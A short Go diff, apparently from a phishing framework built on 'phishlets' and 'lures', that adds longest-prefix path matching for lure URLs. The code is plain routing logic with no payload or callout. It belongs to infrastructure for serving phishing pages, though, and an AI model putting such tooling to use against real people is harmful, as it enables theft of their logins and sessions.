@@ -1033,17 +1033,31 @@ func (c *Config) GetLures() []*Lure {
 }
 
 func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
+	var prefixLure *Lure
+	var prefixLen int
 	for _, l := range c.lures {
 		if l.Phishlet == site {
 			pl, err := c.GetPhishlet(site)
 			if err == nil {
 				if host == l.Hostname || host == pl.GetLandingPhishHost() {
+					// exact match takes precedence
 					if l.Path == path {
 						return l, nil
+					}
+					// prefix match: lure path ends with '/' and the request path starts with it
+					// longest matching prefix wins when multiple lures match
+					if strings.HasSuffix(l.Path, "/") && strings.HasPrefix(path, l.Path) {
+						if prefixLure == nil || len(l.Path) > prefixLen {
+							prefixLure = l
+							prefixLen = len(l.Path)
+						}
 					}
 				}
 			}
 		}
+	}
+	if prefixLure != nil {
+		return prefixLure, nil
 	}
 	return nil, fmt.Errorf("lure for path '%s' not found", path)
 }
